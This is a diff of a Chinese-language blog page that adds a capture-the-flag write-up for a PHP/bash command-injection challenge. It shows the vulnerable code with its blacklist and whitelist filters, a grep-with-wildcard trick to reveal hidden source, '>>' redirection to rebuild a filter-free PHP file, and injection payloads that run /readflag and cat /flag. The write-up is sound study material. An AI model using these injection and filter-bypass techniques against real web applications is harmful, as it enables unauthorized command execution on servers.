@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/failure.ico">
 <meta property="article:published_time" content="2023-11-08T05:31:20.000Z">
-<meta property="article:modified_time" content="2024-01-23T04:17:04.309Z">
+<meta property="article:modified_time" content="2024-03-19T09:19:02.500Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="基础漏洞">
 <meta name="twitter:card" content="summary">
@@ -178,7 +178,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~6.95K
+                        ~11.18K
                     
                     字
                 </li>
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1705983424309"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1710839942500"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -394,6 +394,72 @@
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -oG</span><br></pre></td></tr></table></figure>
 <p>上文已经讲过<code>escapeshellarg+escapeshellcmd+nmap</code>的例子了</p>
+<h3><span id="nu1l-junior-zako"> [nu1l junior] zako</span></h3>
+<p>这个题目感觉很有意思！</p>
+<p>这边配置一下docker起一个环境给大家看看</p>
+<img src="/posts/62381/1.png" class title="awa">
+<p>这里怎么绕这个request就不再讲述了</p>
+<p>这里问题在于中间怎么隐藏了一行东西，这里提示我们要绕一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//something hide here</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;__secret.xswl.io&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">70</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no, &gt; 70&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你就不能绕一下喵&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;./execute.sh &#x27;&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://xn--execute-hc5kp88ags3b70jxq9bviaj971a4dg.sh">这里可以直接查看execute.sh</a>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">reject</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$&#123;1&#125;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">XXXCMD=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line">awk -v str=<span class="string">&quot;<span class="variable">$&#123;XXXCMD&#125;</span>&quot;</span> \</span><br><span class="line"><span class="string">&#x27;BEGIN&#123;</span></span><br><span class="line"><span class="string">    deny=&quot;`;&amp;$()&#123;&#125;[]!@#$%^&amp;*-&quot;;</span></span><br><span class="line"><span class="string">    for(i = 1; i &lt;= length(str); i++)&#123;</span></span><br><span class="line"><span class="string">        char = substr(str, i, 1);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        for(x = 1; x &lt; length(deny)+1; x++)&#123;</span></span><br><span class="line"><span class="string">            r = substr(deny, x, 1);</span></span><br><span class="line"><span class="string">            if(char == r) exit 1;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">[ $? -ne 0 ] &amp;&amp; reject <span class="string">&quot;NOT ALLOW 1&quot;</span></span><br><span class="line"></span><br><span class="line">eval_cmd=`<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;XXXCMD&#125;</span>&quot;</span> | awk -F <span class="string">&quot;|&quot;</span> \</span><br><span class="line"><span class="string">&#x27;BEGIN&#123;</span></span><br><span class="line"><span class="string">    allows[1] = &quot;ls&quot;;</span></span><br><span class="line"><span class="string">    allows[2] = &quot;makabaka&quot;;</span></span><br><span class="line"><span class="string">    allows[3] = &quot;whoareu&quot;;</span></span><br><span class="line"><span class="string">    allows[4] = &quot;cut~no&quot;;</span></span><br><span class="line"><span class="string">    allows[5] = &quot;grep&quot;;</span></span><br><span class="line"><span class="string">    allows[6] = &quot;wc&quot;;</span></span><br><span class="line"><span class="string">    allows[7] = &quot;杂鱼❤~杂鱼❤~&quot;;</span></span><br><span class="line"><span class="string">    allows[8] = &quot;netstat.jpg&quot;;</span></span><br><span class="line"><span class="string">    allows[9] = &quot;awsl&quot;;</span></span><br><span class="line"><span class="string">    allows[10] = &quot;dmesg&quot;;</span></span><br><span class="line"><span class="string">    allows[11] = &quot;xswl&quot;;</span></span><br><span class="line"><span class="string">&#125;&#123;</span></span><br><span class="line"><span class="string">    num=1;</span></span><br><span class="line"><span class="string">    for(i=1; i&lt;=NF; i++)&#123;</span></span><br><span class="line"><span class="string">        for(x=1; x&lt;=length(allows); x++)&#123;</span></span><br><span class="line"><span class="string">            cmpstr = substr($i, 1, length(allows[x]));</span></span><br><span class="line"><span class="string">            if(cmpstr == allows[x])</span></span><br><span class="line"><span class="string">                eval_cmd[num++] = $i;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;END&#123;</span></span><br><span class="line"><span class="string">    for(i=1; i&lt;=length(eval_cmd); i++) &#123;</span></span><br><span class="line"><span class="string">        if(i!=1)</span></span><br><span class="line"><span class="string">            printf &quot;| %s&quot;, eval_cmd[i];</span></span><br><span class="line"><span class="string">        else</span></span><br><span class="line"><span class="string">            printf &quot;%s&quot;, eval_cmd[i];</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">[ <span class="string">&quot;<span class="variable">$&#123;XXXCMD&#125;</span>&quot;</span> = <span class="string">&quot;&quot;</span> ] &amp;&amp; reject <span class="string">&quot;NOT ALLOW 2&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span> <span class="variable">$&#123;eval_cmd&#125;</span></span><br></pre></td></tr></table></figure>
+<p>这是一个bash脚本，简单看下吧，再仔细看我也看不懂</p>
+<ul>
+<li>reject大概就是一个拒绝的意思，说明这样不可以</li>
+<li>这里有deny和allow，大概就是对应白名单和黑名单</li>
+<li>然后检查一下你传进来的参数是否符合白名单和黑名单的要求，最后再eval执行</li>
+</ul>
+<p>这里允许的命令只有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">grep</span><br></pre></td></tr></table></figure>
+<p>禁止的黑名单有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`;&amp;$()&#123;&#125;[]!@#$%^&amp;*-</span><br></pre></td></tr></table></figure>
+<p>用ls看文件：</p>
+<p>返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute.sh index.php</span><br></pre></td></tr></table></figure>
+<p>当前目录只有这两个东西</p>
+<p><code>ls /</code>返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+<p>ps: 这边原本是有个readflag的，为了方便我直接用flag了</p>
+<p>那接下来的问题就是如何利用<code>ls</code>和<code>grep</code>获取到flag了</p>
+<p>grep是可以读文件的</p>
+<p>还有两个地方值得注意的：</p>
+<ul>
+<li>这个源码缺了一部分，注释也在提示我们something hide here</li>
+<li>仔细看system处执行的是将cmd直接拼接，如果利用<code>ls';any cmd</code>就可以造成命令注入rce了</li>
+</ul>
+<p>我们如何获得源码呢？</p>
+<p>这个时候用grep读文件内容(题目也没限制空格)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;&quot; index.php</span><br></pre></td></tr></table></figure>
+<p>发现die了一下</p>
+<img src="/posts/62381/2.png" class title="awa">
+<p>所以这里有过滤</p>
+<p>检查一下，不是grep，不是空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;&quot; </span><br></pre></td></tr></table></figure>
+<p>也没有问题，说明问题出现在index.php上</p>
+<p><code>grep &quot;&quot; *</code>有问题，试试问号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;&quot; ?ndex.php</span><br></pre></td></tr></table></figure>
+<p>获得了index.php的真正源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//something hide here</span></span><br><span class="line"><span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat &quot;</span>.<span class="keyword">__FILE__</span>.<span class="string">&quot; | grep -v preg_match | grep -v highlight&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;__secret.xswl.io&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">70</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no, &gt; 70&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||-|_|\\=|\\*|!|\\%|\\\^|index|execute&#x27;)/is&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你就不能绕一下喵&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;./execute.sh &#x27;&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>原来这里利用的是highlight_string显示的源码</p>
+<p>并且利用<code>grep -v</code>排除了preg_match和highlight这一行</p>
+<p>所以导致我们看不出过滤</p>
+<p>接下来就是重头戏了</p>
+<p>我们这边有符号的双重过滤，能用的只有一个grep，一个ls，那要怎么办呢？</p>
+<p>这边如果flag可以读的话，就直接出了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;flag&quot; /flag</span><br></pre></td></tr></table></figure>
+<p>但是实际题目中flag并不可读，而是需要执行<code>/readflag</code></p>
+<p>还记不记得grep跟cat差不多，而黑名单并没有ban掉<code>&gt;&gt;</code></p>
+<p>唯一能用的地方就只有index.php</p>
+<p>如果我们能够将index.php变成这样就好了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat &quot;</span>.<span class="keyword">__FILE__</span>.<span class="string">&quot; | grep -v preg_match | grep -v highlight&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;__secret.xswl.io&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;./execute.sh &#x27;&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>此时利用<code>&gt;&gt;</code>就能做到</p>
+<p>也就是说，利用grep我们重新将index.php复制到一个新的php去，然后只保留一下部分(因为grep是查找整行)：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;&lt;?php&quot; ?ndex.php &gt;&gt; 1.php</span><br><span class="line">grep &quot;highlight&quot; ?ndex.php &gt;&gt; 1.php</span><br><span class="line">grep &quot;REQUEST&quot; ?ndex.php &gt;&gt; 1.php</span><br><span class="line">grep &quot;system&quot; ?ndex.php &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+<p>此时1.php就会变成这样：</p>
+<img src="/posts/62381/3.png" class title="awa">
+<p>这样我们的cmd就能够愉快的执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?_[secret.xswl.io=ls&#x27;;/readflag;&#x27;</span><br><span class="line">?_[secret.xswl.io=ls&#x27;;cat /flag;&#x27;</span><br></pre></td></tr></table></figure>
+<img src="/posts/62381/4.png" class title="awa">
 </div>
         </div>
         
@@ -486,7 +552,7 @@
                     <a class="tag-none-link" href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" rel="tag">基础漏洞</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-01-23T04:17:04.309Z" itemprop="dateModified">最后编辑：2024-01-23</time>
+                    <time datetime="2024-03-19T09:19:02.500Z" itemprop="dateModified">最后编辑：2024-03-19</time>
                 </div>
             </div>
         </footer>
